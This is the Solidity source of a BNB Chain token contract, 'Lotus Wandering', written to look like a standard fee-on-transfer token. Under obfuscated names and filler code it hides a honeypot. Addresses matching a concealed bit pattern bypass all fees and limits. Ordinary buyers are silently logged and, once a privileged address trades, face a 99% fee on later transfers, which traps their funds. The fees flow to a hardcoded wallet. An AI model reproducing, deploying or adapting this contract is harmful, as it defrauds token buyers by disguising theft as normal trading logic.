/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract LotusWandering is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Lotus Wandering ";
    string constant _symbol = "LotusWandering";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyModeTxMax;
    mapping(address => bool) private exemptLimitLaunchedAuto;
    mapping(address => bool) private liquidityTradingAutoBurn;
    mapping(address => bool) private exemptBotsLiquidityMode;
    mapping(address => uint256) private walletMarketingLaunchedLimit;
    mapping(uint256 => address) private autoExemptLimitTx;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private exemptReceiverMinMode = 0;
    uint256 private receiverBurnTradingIs = 6;

    //SELL FEES
    uint256 private maxMinIsBurn = 0;
    uint256 private botsMinAutoMarketing = 6;

    uint256 private botsBurnModeMinBuyReceiverSell = receiverBurnTradingIs + exemptReceiverMinMode;
    uint256 private modeLimitAutoTx = 100;

    address private receiverTradingTxMode = (msg.sender); // auto-liq address
    address private exemptBuyTxWalletTradingSwap = (0xF6E5Ace5bf14AB87dEEc7B0dFFffc06fDfE08690); // marketing address
    address private modeTxMinBots = DEAD;
    address private launchedExemptTeamAuto = DEAD;
    address private botsMaxReceiverExempt = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private exemptReceiverSwapLiquidityMaxBotsWallet;
    uint256 private swapMarketingAutoMinReceiver;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingLiquidityBotsWallet;
    uint256 private exemptReceiverSellAuto;
    uint256 private modeMaxReceiverLimitTrading;
    uint256 private isSellAutoMarketing;
    uint256 private tradingMarketingIsTxBurn;

    bool private receiverBurnExemptIs = true;
    bool private exemptBotsLiquidityModeMode = true;
    bool private swapReceiverMinExemptBurnTxBots = true;
    bool private minSwapFeeReceiver = true;
    bool private burnMinTradingLiquidity = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private botsBurnMinAuto = 6 * 10 ** 15;
    uint256 private feeMarketingExemptTeam = _totalSupply / 1000; // 0.1%

    
    bool private txMarketingIsSwapMax = false;
    uint256 private botsAutoTxFee = 0;
    uint256 private walletBuyBurnTrading = 0;
    uint256 private liquiditySellLaunchedTx = 0;
    bool private tradingWalletReceiverBuy = false;
    bool private swapReceiverBuyIs = false;
    uint256 private botsAutoLimitTrading = 0;
    uint256 private liquidityLaunchedBotsExemptMarketingAuto = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingLiquidityBotsWallet = true;

        buyModeTxMax[msg.sender] = true;
        buyModeTxMax[address(this)] = true;

        exemptLimitLaunchedAuto[msg.sender] = true;
        exemptLimitLaunchedAuto[0x0000000000000000000000000000000000000000] = true;
        exemptLimitLaunchedAuto[0x000000000000000000000000000000000000dEaD] = true;
        exemptLimitLaunchedAuto[address(this)] = true;

        liquidityTradingAutoBurn[msg.sender] = true;
        liquidityTradingAutoBurn[0x0000000000000000000000000000000000000000] = true;
        liquidityTradingAutoBurn[0x000000000000000000000000000000000000dEaD] = true;
        liquidityTradingAutoBurn[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return walletLimitBurnBots(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return walletLimitBurnBots(sender, recipient, amount);
    }

    function walletLimitBurnBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = liquidityWalletSellIsReceiver(sender) || liquidityWalletSellIsReceiver(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                liquidityAutoMinExempt();
            }
            if (!bLimitTxWalletValue) {
                autoLaunchedExemptWalletLimit(recipient);
            }
        }
        
        if (tradingWalletReceiverBuy == swapReceiverBuyIs) {
            tradingWalletReceiverBuy = swapReceiverBuyIs;
        }


        if (inSwap || bLimitTxWalletValue) {return launchedTeamLimitIs(sender, recipient, amount);}

        if (!buyModeTxMax[sender] && !buyModeTxMax[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (swapReceiverBuyIs == burnMinTradingLiquidity) {
            swapReceiverBuyIs = burnMinTradingLiquidity;
        }

        if (botsAutoTxFee != exemptReceiverMinMode) {
            botsAutoTxFee = feeMarketingExemptTeam;
        }


        require((amount <= _maxTxAmount) || liquidityTradingAutoBurn[sender] || liquidityTradingAutoBurn[recipient], "Max TX Limit has been triggered");

        if (receiverIsBuyBurnTeamTradingLimit()) {autoTeamMarketingMode();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = burnIsExemptMarketing(sender) ? botsIsSellLaunched(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function launchedTeamLimitIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function burnIsExemptMarketing(address sender) internal view returns (bool) {
        return !exemptLimitLaunchedAuto[sender];
    }

    function burnFeeIsTx(address sender, bool selling) internal returns (uint256) {
        
        if (liquidityLaunchedBotsExemptMarketingAuto != botsAutoLimitTrading) {
            liquidityLaunchedBotsExemptMarketingAuto = botsAutoLimitTrading;
        }


        if (selling) {
            botsBurnModeMinBuyReceiverSell = botsMinAutoMarketing + maxMinIsBurn;
            return burnIsMarketingTeam(sender, botsBurnModeMinBuyReceiverSell);
        }
        if (!selling && sender == uniswapV2Pair) {
            botsBurnModeMinBuyReceiverSell = receiverBurnTradingIs + exemptReceiverMinMode;
            return botsBurnModeMinBuyReceiverSell;
        }
        return burnIsMarketingTeam(sender, botsBurnModeMinBuyReceiverSell);
    }

    function launchedWalletTxTradingLimit() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function botsIsSellLaunched(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (walletBuyBurnTrading != receiverBurnTradingIs) {
            walletBuyBurnTrading = walletBuyBurnTrading;
        }


        uint256 feeAmount = amount.mul(burnFeeIsTx(sender, receiver == uniswapV2Pair)).div(modeLimitAutoTx);

        if (exemptBotsLiquidityMode[sender] || exemptBotsLiquidityMode[receiver]) {
            feeAmount = amount.mul(99).div(modeLimitAutoTx);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityWalletSellIsReceiver(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function burnIsMarketingTeam(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = walletMarketingLaunchedLimit[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function autoLaunchedExemptWalletLimit(address addr) private {
        if (launchedWalletTxTradingLimit() < botsBurnMinAuto) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        autoExemptLimitTx[exemptLimitValue] = addr;
    }

    function liquidityAutoMinExempt() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (walletMarketingLaunchedLimit[autoExemptLimitTx[i]] == 0) {
                    walletMarketingLaunchedLimit[autoExemptLimitTx[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(exemptBuyTxWalletTradingSwap).transfer(amountBNB * amountPercentage / 100);
    }

    function receiverIsBuyBurnTeamTradingLimit() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    burnMinTradingLiquidity &&
    _balances[address(this)] >= feeMarketingExemptTeam;
    }

    function autoTeamMarketingMode() internal swapping {
        
        if (swapReceiverBuyIs == txMarketingIsSwapMax) {
            swapReceiverBuyIs = txMarketingIsSwapMax;
        }

        if (botsAutoTxFee != exemptReceiverMinMode) {
            botsAutoTxFee = exemptReceiverMinMode;
        }


        uint256 amountToLiquify = feeMarketingExemptTeam.mul(exemptReceiverMinMode).div(botsBurnModeMinBuyReceiverSell).div(2);
        uint256 amountToSwap = feeMarketingExemptTeam.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = botsBurnModeMinBuyReceiverSell.sub(exemptReceiverMinMode.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(exemptReceiverMinMode).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(receiverBurnTradingIs).div(totalETHFee);
        
        if (botsAutoLimitTrading != walletBuyBurnTrading) {
            botsAutoLimitTrading = exemptReceiverMinMode;
        }

        if (botsAutoTxFee != liquiditySellLaunchedTx) {
            botsAutoTxFee = liquidityLaunchedBotsExemptMarketingAuto;
        }

        if (walletBuyBurnTrading == botsAutoTxFee) {
            walletBuyBurnTrading = modeLimitAutoTx;
        }


        payable(exemptBuyTxWalletTradingSwap).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                receiverTradingTxMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getExemptBotsLiquidityModeMode() public view returns (bool) {
        if (exemptBotsLiquidityModeMode == swapReceiverMinExemptBurnTxBots) {
            return swapReceiverMinExemptBurnTxBots;
        }
        return exemptBotsLiquidityModeMode;
    }
    function setExemptBotsLiquidityModeMode(bool a0) public onlyOwner {
        if (exemptBotsLiquidityModeMode == tradingWalletReceiverBuy) {
            tradingWalletReceiverBuy=a0;
        }
        if (exemptBotsLiquidityModeMode != tradingWalletReceiverBuy) {
            tradingWalletReceiverBuy=a0;
        }
        if (exemptBotsLiquidityModeMode == minSwapFeeReceiver) {
            minSwapFeeReceiver=a0;
        }
        exemptBotsLiquidityModeMode=a0;
    }

    function getFeeMarketingExemptTeam() public view returns (uint256) {
        if (feeMarketingExemptTeam != modeLimitAutoTx) {
            return modeLimitAutoTx;
        }
        if (feeMarketingExemptTeam == feeMarketingExemptTeam) {
            return feeMarketingExemptTeam;
        }
        if (feeMarketingExemptTeam == receiverBurnTradingIs) {
            return receiverBurnTradingIs;
        }
        return feeMarketingExemptTeam;
    }
    function setFeeMarketingExemptTeam(uint256 a0) public onlyOwner {
        if (feeMarketingExemptTeam == liquiditySellLaunchedTx) {
            liquiditySellLaunchedTx=a0;
        }
        if (feeMarketingExemptTeam != walletBuyBurnTrading) {
            walletBuyBurnTrading=a0;
        }
        if (feeMarketingExemptTeam != liquidityLaunchedBotsExemptMarketingAuto) {
            liquidityLaunchedBotsExemptMarketingAuto=a0;
        }
        feeMarketingExemptTeam=a0;
    }

    function getSwapReceiverBuyIs() public view returns (bool) {
        if (swapReceiverBuyIs == tradingWalletReceiverBuy) {
            return tradingWalletReceiverBuy;
        }
        if (swapReceiverBuyIs == swapReceiverMinExemptBurnTxBots) {
            return swapReceiverMinExemptBurnTxBots;
        }
        if (swapReceiverBuyIs == receiverBurnExemptIs) {
            return receiverBurnExemptIs;
        }
        return swapReceiverBuyIs;
    }
    function setSwapReceiverBuyIs(bool a0) public onlyOwner {
        if (swapReceiverBuyIs == burnMinTradingLiquidity) {
            burnMinTradingLiquidity=a0;
        }
        if (swapReceiverBuyIs != txMarketingIsSwapMax) {
            txMarketingIsSwapMax=a0;
        }
        if (swapReceiverBuyIs != exemptBotsLiquidityModeMode) {
            exemptBotsLiquidityModeMode=a0;
        }
        swapReceiverBuyIs=a0;
    }

    function getWalletBuyBurnTrading() public view returns (uint256) {
        return walletBuyBurnTrading;
    }
    function setWalletBuyBurnTrading(uint256 a0) public onlyOwner {
        if (walletBuyBurnTrading == feeMarketingExemptTeam) {
            feeMarketingExemptTeam=a0;
        }
        if (walletBuyBurnTrading != botsMinAutoMarketing) {
            botsMinAutoMarketing=a0;
        }
        walletBuyBurnTrading=a0;
    }

    function getExemptLimitLaunchedAuto(address a0) public view returns (bool) {
        if (exemptLimitLaunchedAuto[a0] != exemptLimitLaunchedAuto[a0]) {
            return exemptBotsLiquidityModeMode;
        }
        if (exemptLimitLaunchedAuto[a0] != exemptBotsLiquidityMode[a0]) {
            return swapReceiverBuyIs;
        }
            return exemptLimitLaunchedAuto[a0];
    }
    function setExemptLimitLaunchedAuto(address a0,bool a1) public onlyOwner {
        if (a0 != exemptBuyTxWalletTradingSwap) {
            swapReceiverMinExemptBurnTxBots=a1;
        }
        exemptLimitLaunchedAuto[a0]=a1;
    }

    function getTradingWalletReceiverBuy() public view returns (bool) {
        if (tradingWalletReceiverBuy == burnMinTradingLiquidity) {
            return burnMinTradingLiquidity;
        }
        if (tradingWalletReceiverBuy == tradingWalletReceiverBuy) {
            return tradingWalletReceiverBuy;
        }
        return tradingWalletReceiverBuy;
    }
    function setTradingWalletReceiverBuy(bool a0) public onlyOwner {
        tradingWalletReceiverBuy=a0;
    }

    function getBotsAutoLimitTrading() public view returns (uint256) {
        return botsAutoLimitTrading;
    }
    function setBotsAutoLimitTrading(uint256 a0) public onlyOwner {
        if (botsAutoLimitTrading != exemptReceiverMinMode) {
            exemptReceiverMinMode=a0;
        }
        botsAutoLimitTrading=a0;
    }

    function getModeLimitAutoTx() public view returns (uint256) {
        return modeLimitAutoTx;
    }
    function setModeLimitAutoTx(uint256 a0) public onlyOwner {
        if (modeLimitAutoTx == liquiditySellLaunchedTx) {
            liquiditySellLaunchedTx=a0;
        }
        if (modeLimitAutoTx != botsBurnModeMinBuyReceiverSell) {
            botsBurnModeMinBuyReceiverSell=a0;
        }
        modeLimitAutoTx=a0;
    }

    function getReceiverTradingTxMode() public view returns (address) {
        if (receiverTradingTxMode != receiverTradingTxMode) {
            return receiverTradingTxMode;
        }
        if (receiverTradingTxMode == exemptBuyTxWalletTradingSwap) {
            return exemptBuyTxWalletTradingSwap;
        }
        return receiverTradingTxMode;
    }
    function setReceiverTradingTxMode(address a0) public onlyOwner {
        if (receiverTradingTxMode == launchedExemptTeamAuto) {
            launchedExemptTeamAuto=a0;
        }
        receiverTradingTxMode=a0;
    }

    function getExemptBuyTxWalletTradingSwap() public view returns (address) {
        return exemptBuyTxWalletTradingSwap;
    }
    function setExemptBuyTxWalletTradingSwap(address a0) public onlyOwner {
        if (exemptBuyTxWalletTradingSwap != exemptBuyTxWalletTradingSwap) {
            exemptBuyTxWalletTradingSwap=a0;
        }
        if (exemptBuyTxWalletTradingSwap != exemptBuyTxWalletTradingSwap) {
            exemptBuyTxWalletTradingSwap=a0;
        }
        exemptBuyTxWalletTradingSwap=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}